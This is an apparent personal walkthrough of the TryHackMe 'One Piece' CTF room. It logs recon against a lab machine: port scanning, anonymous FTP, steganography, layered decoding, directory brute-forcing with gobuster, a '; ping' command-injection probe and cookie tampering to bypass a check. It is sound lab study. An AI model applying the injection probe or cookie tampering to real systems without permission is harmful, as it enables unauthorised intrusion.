----
A CTF room based on the wonderful manga One Piece. Can you become the Pirate King?
----

![](https://tryhackme-images.s3.amazonaws.com/room-icons/ee72b0ca17cd6185e03ed809ba766698.jpeg)

### Task 1  Set Sail

 Start Machine

Welcome to the One Piece room.

Your dream is to find the One Piece and hence to become the Pirate King.

Once the VM is deployed, you will be able to enter a World full of Pirates.

Please notice that pirates do not play fair. They can create rabbit holes to trap you.

This room may be a bit different to what you are used to:  
    - Required skills to perform the intended exploits are pretty basic.  
    - However, solving the (let's say) "enigmas" to know what you need to do may be trickier.  
This room is some sort of game, some sort of puzzle.  

  

> **_Please note that if you are currently reading/watching One Piece and if you did not finish Zou arc, you will get spoiled during this room._**

Answer the questions below

Deploy the machine and hoist the sails  

 Completed

### Task 2  Road Poneglyphs

In order to reach Laugh Tale, the island where the One Piece is located, you must collect the 4 Road Poneglyphs.  

Answer the questions below

```
┌──(witty㉿kali)-[~/Downloads/mnemonic/backups/Mnemonic]
└─$ rustscan -a 10.10.220.152 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.220.152:21
Open 10.10.220.152:22
Open 10.10.220.152:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-07 16:58 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:58
Completed NSE at 16:58, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:58
Completed NSE at 16:58, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:58
Completed NSE at 16:58, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 16:58
Completed Parallel DNS resolution of 1 host. at 16:58, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 16:58
Scanning 10.10.220.152 [3 ports]
Discovered open port 22/tcp on 10.10.220.152
Discovered open port 80/tcp on 10.10.220.152
Discovered open port 21/tcp on 10.10.220.152
Completed Connect Scan at 16:58, 0.20s elapsed (3 total ports)
Initiating Service scan at 16:58
Scanning 3 services on 10.10.220.152
Completed Service scan at 16:58, 6.41s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.220.152.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:58
NSE: [ftp-bounce 10.10.220.152:21] PORT response: 500 Illegal PORT command.
Completed NSE at 16:58, 6.11s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:58
Completed NSE at 16:58, 1.37s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:58
Completed NSE at 16:58, 0.00s elapsed
Nmap scan report for 10.10.220.152
Host is up, received user-set (0.19s latency).
Scanned at 2023-07-07 16:58:27 EDT for 14s

PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             187 Jul 26  2020 welcome.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.19.103
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 011818f9b78ac36c7f922d939055a129 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC45MSZ6fV/xyKjd0Vlj750dJSO5TPl1lrNfd+t+qc4LIKnaMoUsyIuxlnTOSQ0yHhGCxRYaDheybyGr1JqQrFazro9bL5cr3o0LQYLgTWbTcVAgkByqDvblrqUj1c6O4R0Z3BoppqzBgXIsUJFw96HAiYzVJCh9RN2rGnAHmqy8lIS/Z56pFlmiEOc3/W1ccnA/ABAIWkX25Kpxz+QE1eMEWEswLG57qmG8nt0qkOT6hQ9sskVW/ADnUmY3rO/dsP7TXh/IvI1slb6HALUlQXXfGUp/2CwOS7SfIthom8HJ3s7STVVOiAQM6xw6USA9QFLObcUSV0qHpXzJnyQtqtl
|   256 cc0218a9b52b49e45b77f96ec2dbc90d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLQ8y5fOAYcijtTXLprC5JojtRJvMIvbUGGFTMN5eYol3XZucpVKnt/fyLV/5x1jWXsnQixuE2QMCJ6hNRGwHgw=
|   256 b85272e62ad57e563d167bbc518c7b2a (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIWb4BgTYBRRA6bswNkUVwbviPydKMyyWsLyspHwzc/B
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-title: New World
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-favicon: Unknown favicon MD5: C31581B251EA41386CB903FC27B37692
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:58
Completed NSE at 16:58, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:58
Completed NSE at 16:58, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:58
Completed NSE at 16:58, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.98 seconds


┌──(witty㉿kali)-[~/Downloads/mnemonic/backups]
└─$ ftp 10.10.220.152
Connected to 10.10.220.152.
220 (vsFTPd 3.0.3)
Name (10.10.220.152:witty): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -lah
229 Entering Extended Passive Mode (|||16301|)
150 Here comes the directory listing.
drwxr-xr-x    3 0        0            4096 Jul 26  2020 .
drwxr-xr-x    3 0        0            4096 Jul 26  2020 ..
drwxr-xr-x    2 0        0            4096 Jul 26  2020 .the_whale_tree
-rw-r--r--    1 0        0             187 Jul 26  2020 welcome.txt
226 Directory send OK.
ftp> mget *
mget welcome.txt [anpqy?]? yes
229 Entering Extended Passive Mode (|||53377|)
150 Opening BINARY mode data connection for welcome.txt (187 bytes).
100% |*********************************|   187       66.91 KiB/s    00:00 ETA
226 Transfer complete.
187 bytes received in 00:00 (0.83 KiB/s)
ftp> cd .the_whale_tree
250 Directory successfully changed.
ftp> ls -lah
229 Entering Extended Passive Mode (|||11907|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Jul 26  2020 .
drwxr-xr-x    3 0        0            4096 Jul 26  2020 ..
-rw-r--r--    1 0        0            8652 Jul 26  2020 .road_poneglyph.jpeg
-rw-r--r--    1 0        0            1147 Jul 26  2020 .secret_room.txt
226 Directory send OK.
ftp> mget *
ftp> get .road_poneglyph.jpeg
local: .road_poneglyph.jpeg remote: .road_poneglyph.jpeg
229 Entering Extended Passive Mode (|||51738|)
150 Opening BINARY mode data connection for .road_poneglyph.jpeg (8652 bytes).
100% |*********************************|  8652        4.55 MiB/s    00:00 ETA
226 Transfer complete.
8652 bytes received in 00:00 (42.78 KiB/s)
ftp> get .secret_room.txt
local: .secret_room.txt remote: .secret_room.txt
229 Entering Extended Passive Mode (|||8519|)
150 Opening BINARY mode data connection for .secret_room.txt (1147 bytes).
100% |*********************************|  1147       11.88 MiB/s    00:00 ETA
226 Transfer complete.
1147 bytes received in 00:00 (5.72 KiB/s)
ftp> exit
221 Goodbye.

┌──(witty㉿kali)-[~/Downloads/mnemonic/backups]
└─$ cat welcome.txt 
Welcome to Zou. It is an island located on the back of a massive, millennium-old elephant named Zunesha that roams the New World.
Except this, there is not much to say about this island.

┌──(witty㉿kali)-[~/Downloads/mnemonic/backups]
└─$ cat .secret_room.txt
Inuarashi: You reached the center of the Whale, the majestic tree of Zou.
Nekomamushi: We have hidden this place for centuries.
Inuarashi: Indeed, it holds a secret.
Nekomamushi: Do you see this red stele ? This is a Road Poneglyph.
Luffy: A Road Poneglyph ??
Inuarashi: There are four Road Poneglyphs around the world. Each of them gives one of the key to reach Laugh Tale and to find the One Piece.
Luffy: The One Piece ?? That's my dream ! I will find it and I will become the Pirate King !!!
Nekomamushi: A lot have tried but only one succeeded over the centuries, Gol D Roger, the former Pirate King.
Inuarashi: It is commonly known that both Emperors, Big Mom and Kaido, own a Road Poneglyph but no one knows where is the last one.
Nekomamushi: The other issue is the power of Big Mom and Kaido, they are Emperor due to their strength, you won't be able to take them down easily.
Luffy: I will show them, there can be only one Pirate King and it will be me !!
Inuarashi: There is another issue regarding the Road Poneglyph.
Nekomamushi: They are written in an ancient language and a very few people around the world can actually read them. 

┌──(witty㉿kali)-[~/Downloads/mnemonic/backups]
└─$ steghide extract -sf .road_poneglyph.jpeg 
Enter passphrase: 
wrote extracted data to "road_poneglyphe1.txt".
                                                                              
┌──(witty㉿kali)-[~/Downloads/mnemonic/backups]
└─$ cat road_poneglyphe1.txt 
FUWS2LJNEAWS2LJNFUQC4LJNFUWSALRNFUWS2IBNFUWS2LJAFUWS2LJNEAXC2LJNFUQC4LJNFUWQULJNFUWS2IBNFUWS2LJAFYWS2LJNEAXC2LJNFUQC2LJNFUWSALJNFUWS2IBOFUWS2LJAFYWS2LJNBIWS2LJNFUQC2LJNFUWSALRNFUWS2IBNFUWS2LJAFUWS2LJNEAWS2LJNFUQC2LJNFUWSALJNFUWS2CRNFUWS2LJAFUWS2LJNEAXC2LJNFUQC4LJNFUWSALJNFUWS2IBOFUWS2LJAFUWS2LJNEAWS2LJNFUFC2LJNFUWSALJNFUWS2IBOFUWS2LJAFYWS2LJNEAXC2LJNFUQC2LJNFUWSALJNFUWS2IBNFUWS2LIKFUWS2LJNEAWS2LJNFUQC4LJNFUWSALJNFUWS2IBNFUWS2LJAFUWS2LJNEAWS2LJNFUQC2LJNFUWQULJNFUWS2IBNFUWS2LJAFYWS2LJNEAXC2LJNFUQC2LJNFUWSALRNFUWS2IBNFUWS2LJAFYWS2LJNBIWS2LJNFUQC2LJNFUWSALRNFUWS2IBOFUWS2LJAFUWS2LJNEAXC2LJNFUQC2LJNFUWSALJNFUWS2CRNFUWS2LJAFUWS2LJNEAXC2LJNFUQC2LJNFUWSALJNFUWS2IBNFUWS2LJAFUWS2LJNEAWS2LJNFUFC2LJNFUWSALJNFUWS2IBOFUWS2LJAFYWS2LJNEAWS2LJNFUQC4LJNFUWSALJNFUWS2IBOFUWS2LIKFUWS2LJNEAWS2LJNFUQC4LJNFUWSALRNFUWS2IBOFUWS2LJAFUWS2LJNEAWS2LJNFUQC2LJNFUWQULJNFUWS2IBNFUWS2LJAFYWS2LJNEAWS2LJNFUQC2LJNFUWSALJNFUWS2IBNFUWS2LJAFUWS2LJNBIWS2LJNFUQC2LJNFUWSALRNFUWS2IBOFUWS2LJAFUWS2LJNEAXC2LJNFUQC4LJNFUWSALJNFUWS2CRNFUWS2LJAFUWS2LJNEAXC2LJNFUQC4LJNFUWSALRNFUWS2IBNFUWS2LJAFUWS2LJNEAXC2LJNFUFC2LJNFUWSALJNFUWS2IBOFUWS2LJAFUWS2LJNEAWS2LJNFUQC2LJNFUWSALJNFUWS2IBNFUWS2LIKFUWS2LJNEAWS2LJNFUQC4LJNFUWSALRNFUWS2IBNFUWS2LJAFUWS2LJNEAXC2LJNFUQC4LJNFUWQULJNFUWS2IBNFUWS2LJAFYWS2LJNEAXC2LJNFUQC4LJNFUWSALJNFUWS2IBNFUWS2LJAFYWS2LJNBIWS2LJNFUQC2LJNFUWSALRNFUWS2IBNFUWS2LJAFUWS2LJNEAWS2LJNFUQC2LJNFUWSALJNFUWS2CRNFUWS2LJAFUWS2LJNEAXC2LJNFUQC4LJNFUWSALJNFUWS2IBOFUWS2LJAFYWS2LJNEAWS2LJNFUFC2LJNFUWSALJNFUWS2IBOFUWS2LJAFYWS2LJNEAXC2LJNFUQC2LJNFUWSALJNFUWS2IBOFUWS2LIKFUWS2LJNEAWS2LJNFUQC4LJNFUWSALJNFUWS2IBNFUWS2LJAFUWS2LJNEAWS2LJNFUQC2LJNFUWQULJNFUWS2IBNFUWS2LJAFYWS2LJNEAXC2LJNFUQC2LJNFUWSALJNFUWS2IBOFUWS2LJAFYWS2LJNBIWS2LJNFUQC2LJNFUWSALRNFUWS2IBOFUWS2LJAFUWS2LJNEAWS2LJNFUQC4LJNFUWSALJNFUWS2CRNFUWS2LJAFUWS2LJNEAXC2LJNFUQC2LJNFUWSALJNFUWS2IBNFUWS2LJAFUWS2LJNEAWS2LJNFUFC2LJNFUWSALJNFUWS2IBOFUWS2LJAFYWS2LJNEAWS2LJNFUQC4LJNFUWSALJNFUWS2IBOFUWS2LIKFUWS2LJNEAWS2LJNFUQC4LJNFUWSALRNFUWS2IBNFUWS2LJAFYWS2LJNEAWS2LJNFUQC2LJNFUWQULJNFUWS2IBNFUWS2LJAFYWS2LJNEAWS2LJNFUQC2LJNFUWSALJNFUWS2IBNFUWS2LJAFUWS2LJNBIWS2LJNFUQC2LJNFUWSALRNFUWS2IBOFUWS2LJAFUWS2LJNEAWS2LJNFUQC4LJNFUWSALRNFUWS2CRNFUWS2LJAFUWS2LJNEAXC2LJNFUQC4LJNFUWSALJNFUWS2IBNFUWS2LJAFYWS2LJNEAWS2LJNFUFC2LJNFUWSALJNFUWS2IBOFUWS2LJAFUWS2LJNEAWS2LJNFUQC2LJNFUWSALJNFUWS2IBNFUWS2LIK

view-source:http://10.10.220.152/

<!--J5VEKNCJKZEXEUSDJZEE2MC2M5KFGWJTJMYFMV2PNE2UMWLJGFBEUVKWNFGFKRJQKJLUS5SZJBBEOS2FON3U4U3TFNLVO2ZRJVJXARCUGFHEOS2YKVWUWVKON5HEOQLVKEZGI3S2GJFEOSKTPBRFAMCGKVJEIODQKJUWQ3KMIMYUCY3LNBGUWMCFO5IGYQTWKJ4VMRK2KRJEKWTMGRUVCMCKONQTGTJ5-->

https://cyberchef.io/#recipe=From_Base32('A-Z2-7%3D',false)From_Base64('A-Za-z0-9%2B/%3D',true)From_Base85('!-u')&input=SjVWRUtOQ0pLWkVYRVVTREpaRUUyTUMyTTVLRkdXSlRKTVlGTVYyUE5FMlVNV0xKR0ZCRVVWS1dORkdGS1JKUUtKTFVTNVNaSkJCRU9TMkZPTjNVNFUzVEZOTFZPMlpSSlZKWEFSQ1VHRkhFT1MyWUtWV1VXVktPTjVIRU9RTFZLRVpHSTNTMkdKRkVPU0tUUEJSRkFNQ0dLVkpFSU9EUUtKVVdRM0tNSU1ZVUNZM0xOQkdVV01DRk81SUdZUVRXS0o0Vk1SSzJLUkpFS1dUTUdSVVZDTUNLT05RVEdUSjU

so base32, base64 and base85

:18!R+D#G3F`M&7+EV:.Eb-A%Eb-A4Eb/`pF(K05+>Yi51*COSF)u&)Ch4`.CgggbF!,[?ATD?)F(f,-@rHL+A0>PoG%De4Df^"CBlks

Nami ensures there are precisely 3472 possible places where she could have lost it.

OSINT

https://github.com/1FreyR/LogPose

┌──(witty㉿kali)-[~/Downloads]
└─$ gobuster -t 64 dir -e -k -u http://10.10.220.152/ -w /home/witty/Downloads/LogPose.txt -x txt,php,zip,bak,py,html 
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.220.152/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /home/witty/Downloads/LogPose.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              bak,py,html,txt,php,zip
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2023/07/07 17:25:35 Starting gobuster in directory enumeration mode
===============================================================
Progress: 643 / 24311 (2.64%)[ERROR] 2023/07/07 17:25:45 [!] Get 
http://10.10.220.152/dr3ssr0s4.html       (Status: 200) [Size: 3985]

You reach Dressrosa Island, an island ruled by one of the seven Warlords, Donquixote Doflamingo.<br/>
        He took over the island, you are horrified and decide to take him down.


view-source:http://10.10.220.152/images/rabbit_hole.png

let's download

┌──(witty㉿kali)-[~]
└─$ eog rabbithole.png   
^C
                                                                                       
┌──(witty㉿kali)-[~]
└─$ tesseract rabbithole.png output_1 -l eng txt && cat output_1.txt
6b 65 79 3a 69 6d 20 6f 6e 20 6f 74 69 20 Gf 74 69

m5.J`/{{#F%&!5Gl}+n<a

Lhtttavbsw ql gbbzy gfivwwvz


https://www.dcode.fr/ascii-code

|   |   |
|---|---|
|HEX /1-2|key:im on oti ti|

https://www.dcode.fr/base-91-encoding
ito ito no mi:yek

https://www.dcode.fr/vigenere-cipher

key: ITOITONOMI

Doflamingo is still standing

https://onepiece.fandom.com/es/wiki/Fruta_Ito_Ito

view-source:http://10.10.220.152/css/dressrosa_style.css

#container {
    height: 75vh;
    width: 90vw;
    margin: 1vh;
    background-image: url("../king_kong_gun.jpg");
    background-repeat: no-repeat;
    background-position: center;
    background-size: cover;
    display: flex;
    flex-direction: row;
    justify-content: center;
    align-items: flex-start;
    align-content: flex-start;
    flex-wrap: wrap;
    position: relative;
}

http://10.10.220.152/king_kong_gun.jpg

┌──(witty㉿kali)-[~]
└─$ exiftool king_kong_gun.jpg  
ExifTool Version Number         : 12.57
File Name                       : king_kong_gun.jpg
Directory                       : .
File Size                       : 43 kB
File Modification Date/Time     : 2023:07:07 17:46:22-04:00
File Access Date/Time           : 2023:07:07 17:46:22-04:00
File Inode Change Date/Time     : 2023:07:07 17:46:22-04:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : inches
X Resolution                    : 72
Y Resolution                    : 72
Comment                         : Doflamingo is /ko.jpg
Image Width                     : 736
Image Height                    : 414
Encoding Process                : Progressive DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 736x414
Megapixels                      : 0.305

http://10.10.220.152/ko.jpg

┌──(witty㉿kali)-[~]
└─$ exiftool ko.jpg            
ExifTool Version Number         : 12.57
File Name                       : ko.jpg
Directory                       : .
File Size                       : 176 kB
File Modification Date/Time     : 2023:07:07 17:46:58-04:00
File Access Date/Time           : 2023:07:07 17:46:58-04:00
File Inode Change Date/Time     : 2023:07:07 17:46:58-04:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Image Width                     : 1280
Image Height                    : 720
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 1280x720
Megapixels                      : 0.922

┌──(witty㉿kali)-[~]
└─$ strings ko.jpg | tac
Congratulations, this is the Log Pose that should lead you to the next island: /wh0l3_c4k3.php

You are on Whole Cake Island. This is the territory of Big Mom, one of the 4 Emperors, this is to say one of the 4 pirates the closest to the One Piece but also the strongest.
Big Mom chases you and want to destroy you. It is unthinkable to fight her directly.
You need to find a way to appease her. 

<!--Big Mom likes cakes-->

┌──(witty㉿kali)-[~]
└─$ sudo tcpdump -i tun0 icmp                                       
[sudo] password for witty: 
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes

; ping 10.8.19.103  (Not RCE)

Cookies

NoCakeForYou

changing value

CakeForYou

You successfully stole a copy of the 2nd Road Poneglyph: FUWS2LJNEAWS2LJNFUQC4LJNFUWSALRNFUWS2IBNFUWS2LJAFUWS2LJNEAXC2LJNFUQC4LJNFUWQULJNFUWS2IBNFUWS2LJAFYWS2LJNEAXC2LJNFUQC2LJNFUWSALRNFUWS2IBNFUWS2LJAFYWS2LJNBIWS2LJNFUQC2LJNFUWSALRNFUWS2IBNFUWS2LJAFUWS2LJNEAWS2LJNFUQC2LJNFUWSALJNFUWS2CRNFUWS2LJAFUWS2LJNEAXC2LJNFUQC4LJNFUWSALJNFUWS2IBNFUWS2LJAFYWS2LJNEAXC2LJNFUFC2LJNFUWSALJNFUWS2IBOFUWS2LJAFYWS2LJNEAWS2LJNFUQC4LJNFUWSALJNFUWS2IBOFUWS2LIKFUWS2LJNEAWS2LJNFUQC4LJNFUWSALJNFUWS2IBNFUWS2LJAFUWS2LJNEAWS2LJNFUQC2LJNFUWQULJNFUWS2IBNFUWS2LJAFYWS2LJNEAXC2LJNFUQC2LJNFUWSALRNFUWS2IBNFUWS2LJAFUWS2LJNBIWS2LJNFUQC4LJNFUWSALRNFUWS2IBNFUWS2LJAFUWS2LJNEAWS2LJNFUQC4LJNFUWSALRNFUWS2CRNFUWS2LJAFUWS2LJNEAXC2LJNFUQC2LJNFUWSALJNFUWS2IBNFUWS2LJAFUWS2LJNEAWS2LJNFUFC2LJNFUWSALJNFUWS2IBOFUWS2LJAFYWS2LJNEAWS2LJNFUQC2LJNFUWSALRNFUWS2IBOFUWS2LIKFUWS2LJNEAWS2LJNFUQC4LJNFUWSALRNFUWS2IBOFUWS2LJAFUWS2LJNEAWS2LJNFUQC4LJNFUWQULJNFUWS2IBNFUWS2LJAFYWS2LJNEAWS2LJNFUQC2LJNFUWSALJNFUWS2IBNFUWS2LJAFUWS2LJNBIWS2LJNFUQC2LJNFUWSALRNFUWS2IBOFUWS2LJAFUWS2LJNEAXC2LJNFUQC4LJNFUWSALRNFUWS2CRNFUWS2LJAFUWS2LJNEAXC2LJNFUQC4LJNFUWSALJNFUWS2IBNFUWS2LJAFYWS2LJNEAXC2LJNFUFC2LJNFUWSALJNFUWS2IBOFUWS2LJAFUWS2LJNEAWS2LJNFUQC2LJNFUWSALJNFUWS2IBNFUWS2LIKFUWS2LJNEAWS2LJNFUQC4LJNFUWSALRNFUWS2IBNFUWS2LJAFYWS2LJNEAWS2LJNFUQC2LJNFUWQULJNFUWS2IBOFUWS2LJAFYWS2LJNEAWS2LJNFUQC2LJNFUWSALRNFUWS2IBNFUWS2LJAFUWS2LJNBIWS2LJNFUQC2LJNFUWSALRNFUWS2IBNFUWS2LJAFUWS2LJNEAWS2LJNFUQC2LJNFUWSALJNFUWS2CRNFUWS2LJAFUWS2LJNEAXC2LJNFUQC4LJNFUWSALJNFUWS2IBOFUWS2LJAFUWS2LJNEAWS2LJNFUFC2LJNFUWSALJNFUWS2IBOFUWS2LJAFYWS2LJNEAWS2LJNFUQC4LJNFUWSALJNFUWS2IBNFUWS2LIKFUWS2LJNEAWS2LJNFUQC4LJNFUWSALJNFUWS2IBNFUWS2LJAFUWS2LJNEAWS2LJNFUQC2LJNFUWQULJNFUWS2IBNFUWS2LJAFYWS2LJNEAXC2LJNFUQC2LJNFUWSALRNFUWS2IBOFUWS2LJAFYWS2LJNBIWS2LJNFUQC2LJNFUWSALRNFUWS2IBOFUWS2LJAFUWS2LJNEAWS2LJNFUQC2LJNFUWSALJNFUWS2CRNFUWS2LJAFUWS2LJNEAXC2LJNFUQC2LJNFUWSALJNFUWS2IBNFUWS2LJAFUWS2LJNEAWS2LJNFUFC2LJNFUWSALJNFUWS2IBOFUWS2LJAFYWS2LJNEAWS2LJNFUQC4LJNFUWSALRNFUWS2IBOFUWS2LIKFUWS2LJNEAWS2LJNFUQC4LJNFUWSALRNFUWS2IBNFUWS2LJAFUWS2LJNEAWS2LJNFUQC2LJNFUWQULJNFUWS2IBNFUWS2LJAFYWS2LJNEAWS2LJNFUQC2LJNFUWSALJNFUWS2IBNFUWS2LJAFUWS2LJNBIWS2LJNFUQC2LJNFUWSALRNFUWS2IBOFUWS2LJAFUWS2LJNEAXC2LJNFUQC4LJNFUWSALJNFUWS2CRNFUWS2LJAFUWS2LJNEAXC2LJNFUQC4LJNFUWSALJNFUWS2IBOFUWS2LJAFYWS2LJNEAWS2LJNFUFC2LJNFUWSALJNFUWS2IBOFUWS2LJAFUWS2LJNEAWS2LJNFUQC2LJNFUWSALJNFUWS2IBNFUWS2LIKFUWS2LJNEAWS2LJNFUQC4LJNFUWSALRNFUWS2IBNFUWS2LJAFYWS2LJNEAWS2LJNFUQC4LJNFUWQULJNFUWS2IBNFUWS2LJAFYWS2LJNEAXC2LJNFUQC2LJNFUWSALJNFUWS2IBOFUWS2LJAFUWS2LJNBIWS2LJNFUQC2LJNFUWSALRNFUWS2IBNFUWS2LJAFUWS2LJNEAWS2LJNFUQC2LJNFUWSALJNFUWS2CRNFUWS2LJAFUWS2LJNEAXC2LJNFUQC4LJNFUWSALJNFUWS2IBOFUWS2LJAFYWS2LJNEAWS2LJNFUFC2LJNFUWSALRNFUWS2IBOFUWS2LJAFUWS2LJNEAWS2LJNFUQC2LJNFUWSALJNFUWS2IBOFUWS2LIKFUWS2LJNEAWS2LJNFUQC4LJNFUWSALJNFUWS2IBNFUWS2LJAFUWS2LJNEAWS2LJNFUQC2LJNFUWQULJNFUWS2IBNFUWS2LJAFYWS2LJNEAXC2LJNFUQC2LJNFUWSALRNFUWS2IBNFUWS2LJAFYWS2LJNBIWS2LJNFUQC2LJNFUWSALRNFUWS2IBOFUWS2LJAFUWS2LJNEAXC2LJNFUQC2LJNFUWSALRNFUWS2CRNFUWS2LJAFUWS2LJNEAXC2LJNFUQC2LJNFUWSALJNFUWS2IBNFUWS2LJAFUWS2LJNEAWS2LJNFUFC2LJNFUWSALJNFUWS2IBOFUWS2LJAFYWS2LJNEAWS2LJNFUQC4LJNFUWSALRNFUWS2IBOFUWS2LIKFUWS2LJNEAXC2LJNFUQC4LJNFUWSALJNFUWS2IBNFUWS2LJAFUWS2LJNEAWS2LJNFUQC4LJNFUWQULJNFUWS2IBNFUWS2LJAFYWS2LJNEAWS2LJNFUQC2LJNFUWSALJNFUWS2IBNFUWS2LJAFUWS2LJNBIWS2LJNFUQC2LJNFUWSALRNFUWS2IBOFUWS2LJAFUWS2LJNEAXC2LJNFUQC2LJNFUWSALRNFUWS2CRNFUWS2LJAFUWS2LJNEAXC2LJNFUQC4LJNFUWSALJNFUWS2IBOFUWS2LJAFYWS2LJNEAWS2LJNFUFC2LJNFUWSALJNFUWS2IBOFUWS2LJAFUWS2LJNEAWS2LJNFUQC2LJNFUWSALJNFUWS2IBNFUWS2LIKFUWS2LJNEAWS2LJNFUQC4LJNFUWSALRNFUWS2IBNFUWS2LJAFYWS2LJNEAWS2LJNFUQC4LJNFUWQULJNFUWS2IBNFUWS2LJAFYWS2LJNEAXC2LJNFUQC2LJNFUWSALRNFUWS2IBOFUWS2LJAFUWS2LJNBIWS2LJNFUQC2LJNFUWSALRNFUWS2IBNFUWS2LJAFUWS2LJNEAWS2LJNFUQC2LJNFUWSALJNFUWS2CRNFUWS2LJAFUWS2LJNEAXC2LJNFUQC4LJNFUWSALJNFUWS2IBNFUWS2LJAFYWS2LJNEAXC2LJNFUFC2LJNFUWSALJNFUWS2IBOFUWS2LJAFYWS2LJNEAWS2LJNFUQC2LJNFUWSALJNFUWS2IBOFUWS2LIKFUWS2LJNEAWS2LJNFUQC4LJNFUWSALJNFUWS2IBNFUWS2LJAFUWS2LJNEAWS2LJNFUQC2LJNFUWQULJNFUWS2IBNFUWS2LJAFYWS2LJNEAXC2LJNFUQC2LJNFUWSALJNFUWS2IBOFUWS2LJAFYWS2LJNBIWS2LJNFUQC2LJNFUWSALRNFUWS2IBOFUWS2LJAFUWS2LJNEAWS2LJNFUQC2LJNFUWSALRNFUWS2CRNFUWS2LJAFUWS2LJNEAXC2LJNFUQC2LJNFUWSALJNFUWS2IBNFUWS2LJAFUWS2LJNEAWS2LJNFUFC2LJNFUWSALJNFUWS2IBOFUWS2LJAFYWS2LJNEAWS2LJNFUQC4LJNFUWSALJNFUWS2IBOFUWS2LIKFUWS2LJNEAWS2LJNFUQC4LJNFUWSALRNFUWS2IBNFUWS2LJAFYWS2LJNEAWS2LJNFUQC4LJNFUWQULJNFUWS2IBNFUWS2LJAFYWS2LJNEAWS2LJNFUQC2LJNFUWSALJNFUWS2IBNFUWS2LJAFUWS2LJNBIWS2LJNFUQC2LJNFUWSALRNFUWS2IBOFUWS2LJAFUWS2LJNEAXC2LJNFUQC4LJNFUWSALJNFUWS2CRNFUWS2LJAFUWS2LJNEAXC2LJNFUQC4LJNFUWSALJNFUWS2IBNFUWS2LJAFUWS2LJNEAXC2LJNFUFC2LJNFUWSALJNFUWS2IBOFUWS2LJAFUWS2LJNEAWS2LJNFUQC2LJNFUWSALJNFUWS2IBNFUWS2LIKFUWS2LJNEAWS2LJNFUQC4LJNFUWSALRNFUWS2I